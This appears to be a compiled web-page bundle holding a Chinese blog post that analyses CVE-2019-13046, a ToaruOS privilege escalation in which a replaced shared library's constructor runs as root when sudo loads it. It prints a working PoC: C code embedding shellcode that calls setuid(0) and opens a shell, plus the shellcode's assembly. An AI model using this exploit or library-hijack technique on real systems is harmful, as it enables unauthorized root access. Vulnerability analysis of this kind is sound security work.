(window.webpackJsonp=window.webpackJsonp||[]).push([[14],{314:function(t,a,s){t.exports=s.p+"assets/img/toaruos2-fetch-run.5deef8a1.png"},315:function(t,a,s){t.exports=s.p+"assets/img/toaruos2-root.c7b5a37b.png"},346:function(t,a,s){"use strict";s.r(a);var e=[function(){var t=this,a=t.$createElement,e=t._self._c||a;return e("div",{staticClass:"content"},[e("h2",{attrs:{id:"cve-2019-13046-toaruos-sudo-llinker-提权漏洞分析"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cve-2019-13046-toaruos-sudo-llinker-提权漏洞分析","aria-hidden":"true"}},[t._v("#")]),t._v(" CVE-2019-13046 ToaruOS sudo/llinker 提权漏洞分析")]),t._v(" "),e("p",[t._v("之前分析过一个ToaruOS 操作系统提权的漏洞，感觉十分有意思，这里在分析一个利用ToaruOS llinker + sudo提权的漏洞")]),t._v(" "),e("h2",{attrs:{id:"_0x1-attribute-介绍"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x1-attribute-介绍","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x1 __attribute__介绍")]),t._v(" "),e("p",[t._v("__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数")]),t._v(" "),e("p",[t._v("__attribute__语法格式为：__attribute__((attribute-list))")]),t._v(" "),e("p",[t._v("若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序:")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v('#include <stdio.h>\n__attribute__((constructor)) void begin()\n{\n    printf("Constructor is called.\\n");\n}\n__attribute__((destructor)) void after()\n{\n    printf("destructor is called.\\n");\n}\nint main()\n{\n    printf("hello world\\n");\n    return 0;\n}\n')])])]),e("p",[t._v("输出")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("Constructor is called.\nhello world\ndestructor is called.\n")])])]),e("h2",{attrs:{id:"_0x2-toaruos动态链接问题"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x2-toaruos动态链接问题","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x2  ToaruOS动态链接问题")]),t._v(" "),e("p",[t._v("把下面的代码编译成动态链接库")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v('#include <stdio.h>\n__attribute__((constructor)) void begin()\n{\n    printf("hello world\\n");\n}\n')])])]),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("gcc -fPIC -shared so.c -o so.so\n")])])]),e("p",[t._v("根据toaruos的编译过程我们知道fetch程序会动态链接toaru_hashmap库")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("./toaruos-1.10.9/.make/fetch.mak:\t\n$(CC) $(CFLAGS)   -o $@ $< -ltoaru_hashmap -ltoaru_list\n")])])]),e("p",[t._v("在ToaruOS里替换libtoaru_hashmap.so为我们上面编译的so程序，运行fetch 程序\nfetch加载了我们的so文件，自动执行了constructor函数(图片第二行)。")]),t._v(" "),e("p",[e("img",{attrs:{src:s(314),alt:"avatar"}})]),t._v(" "),e("p",[t._v("如果有一个root权限的程序也加载了我们的so文件，我们就能以root权限执行任意代码，完成提权。这个程序就是sudo")]),t._v(" "),e("h2",{attrs:{id:"_0x3-sudo-程序"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x3-sudo-程序","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x3 sudo 程序")]),t._v(" "),e("p",[t._v("ToaruOS系统启动后加载各个程序，最后启动桌面程序，并赋权限为local。此后用户在桌面上执行的程序都由所有操作都是local权限。如果用户需要root权限怎么办，答案是依靠sudo程序。")]),t._v(" "),e("p",[t._v("sudo程序具有SUID权限，sudo程序在验证用户的密码之后setuid(0)，赋予当前进程的权限为root，接下来fork出来的进程也就是root权限，就是sudo后边跟的参数。")]),t._v(" "),e("p",[t._v("根据sudo程序的编译过程我们知道，sudo 依赖于toaru_auth.so文件。")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("cat ./.make/sudo.mak \nbase/bin/sudo: apps/sudo.c base/usr/include/toaru/auth.h util/auto-dep.py | base/lib/libtoaru_auth.so $(LC)\n\t$(CC) $(CFLAGS)   -o $@ $< -ltoaru_auth\n\n")])])]),e("p",[t._v("接下来只要替换toaru_auth.so为我们的自己构造的toaru_auth.so文件，执行sudo程序我们就能以root权限执行任意代码，最后提权了。")]),t._v(" "),e("p",[t._v("最后poc.c")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("unsigned char shellcode[] = {\n  0x31, 0xc0, 0x04, 0x18, 0x31, 0xdb, 0xcd, 0x7f, 0xeb, 0x1a, 0x5b, 0x31,\n  0xc0, 0x88, 0x43, 0x07, 0x89, 0x5b, 0x08, 0x89, 0x43, 0x0c, 0x04, 0x07,\n  0x8d, 0x4b, 0x08, 0x8d, 0x53, 0x0c, 0xcd, 0x7f, 0x31, 0xc0, 0xcd, 0x7f,\n  0xe8, 0xe1, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,\n  0x68, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58\n};\n__attribute__((constructor)) void mehness(void)\n{\n\t((void (*)(void))shellcode)();\n}\n\n")])])]),e("p",[e("img",{attrs:{src:s(315),alt:"avatar"}})]),t._v(" "),e("h2",{attrs:{id:"_0x4-payload"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x4-payload","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x4 payload")]),t._v(" "),e("p",[t._v("payload 在我上篇分析ToaruOS提权漏洞时讲过，这里直接复制过来。")]),t._v(" "),e("p",[t._v("在payload 首先执行setuid(0)设置当前进程权限，然后执行system(/bin/shh)返回shell。toaruOS通过int 0x7f调用系统函数，在syscall_nums.h中有系统调用号，setuid对应24，system对应7。")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v('    xor eax, eax\n    add al, 24\n    xor ebx, ebx\n    int 0x7f\n    jmp short end\nstart:\n    pop ebx\n    xor eax, eax\n    mov [ebx+7], al\n    mov [ebx+8], ebx\n    mov [ebx+12], eax\n    add al, 7\n    lea ecx, [ebx+8]\n    lea edx, [ebx+12]\n    int 0x7f\n    xor eax, eax\n    int 0x7f\nend:\n    call start\ndb "/bin/shh"\ndb "XXXXXXXX"\n')])])])])}],r=s(1),o=Object(r.a)({},function(){this.$createElement;this._self._c;return this._m(0)},e,!1,null,null,null);a.default=o.exports}}]);